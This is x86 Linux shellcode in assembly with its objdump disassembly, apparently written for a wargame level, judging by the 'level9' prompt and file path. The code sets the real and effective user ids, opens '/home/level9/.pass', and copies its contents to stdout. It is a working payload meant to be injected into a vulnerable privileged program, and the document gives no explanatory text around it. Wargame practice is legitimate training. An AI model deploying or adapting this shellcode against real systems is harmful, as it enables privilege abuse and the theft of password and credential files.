section .text
global _start


_start:
; setreuid()
;  push $0x31
;  pop  %eax
  xor %eax, %eax
  movb $49, %al
  cltd
  int $0x80
  mov %eax, %ebx
  mov %eax, %ecx
  xor %eax, %eax
  mov $70, %al
  int $0x80
  xor %eax, %eax
  xor  %ebx, %ebx
  xor  %ecx, %ecx
  xor  %edx, %edx
  jmp  two

one:
  pop  %ebx
  
  movb  $5, %al
  xor  %ecx, %ecx
  int  $0x80
  
  mov  %eax, %esi
  jmp  read

exit:
  movb  $1, %al
  xor  %ebx, %ebx
  int  $0x80

read:
  mov  %esi, %ebx
  movb  $3, %al
  sub  $1, %esp
  lea  (%esp), %ecx
  movb  $1, %dl
  int  $0x80

  xor  %ebx, %ebx
  cmp  %eax, %ebx
  je  exit

  movb  $4, %al
  movb  $1, %bl
  movb  $1, %dl
  int  $0x80
  
  add  $1, %esp
  jmp  read

two:
  call  one
  .string  "/home/level9/.pass"




  
08048054 <.text>:
 8048054:       31 c0                   xor    %eax,%eax
 8048056:       b0 31                   mov    $0x31,%al
 8048058:       99                      cltd   
 8048059:       cd 80                   int    $0x80
 804805b:       89 c3                   mov    %eax,%ebx
 804805d:       89 c1                   mov    %eax,%ecx
 804805f:       31 c0                   xor    %eax,%eax
 8048061:       b0 46                   mov    $0x46,%al
 8048063:       cd 80                   int    $0x80
 8048065:       31 c0                   xor    %eax,%eax
 8048067:       31 db                   xor    %ebx,%ebx
 8048069:       31 c9                   xor    %ecx,%ecx
 804806b:       31 d2                   xor    %edx,%edx
 804806d:       eb 32                   jmp    0x80480a1
 804806f:       5b                      pop    %ebx
 8048070:       b0 05                   mov    $0x5,%al
 8048072:       31 c9                   xor    %ecx,%ecx
 8048074:       cd 80                   int    $0x80
 8048076:       89 c6                   mov    %eax,%esi
 8048078:       eb 06                   jmp    0x8048080
 804807a:       b0 01                   mov    $0x1,%al
 804807c:       31 db                   xor    %ebx,%ebx
 804807e:       cd 80                   int    $0x80
 8048080:       89 f3                   mov    %esi,%ebx
 8048082:       b0 03                   mov    $0x3,%al
 8048084:       83 ec 01                sub    $0x1,%esp
 8048087:       8d 0c 24                lea    (%esp),%ecx
 804808a:       b2 01                   mov    $0x1,%dl
 804808c:       cd 80                   int    $0x80
 804808e:       31 db                   xor    %ebx,%ebx
 8048090:       39 c3                   cmp    %eax,%ebx
 8048092:       74 e6                   je     0x804807a
 8048094:       b0 04                   mov    $0x4,%al
 8048096:       b3 01                   mov    $0x1,%bl
 8048098:       b2 01                   mov    $0x1,%dl
 804809a:       cd 80                   int    $0x80
 804809c:       83 c4 01                add    $0x1,%esp
 804809f:       eb df                   jmp    0x8048080
 80480a1:       e8 c9 ff ff ff          call   0x804806f
 80480a6:       2f                      das    
 80480a7:       68 6f 6d 65 2f          push   $0x2f656d6f
 80480ac:       6c                      insb   (%dx),%es:(%edi)
 80480ad:       65                      gs
 80480ae:       76 65                   jbe    0x8048115
 80480b0:       6c                      insb   (%dx),%es:(%edi)
 80480b1:       39 2f                   cmp    %ebp,(%edi)
 80480b3:       2e 70 61                jo,pn  0x8048117
 80480b6:       73 73                   jae    0x804812b
        ...
[level9@logic code]$ 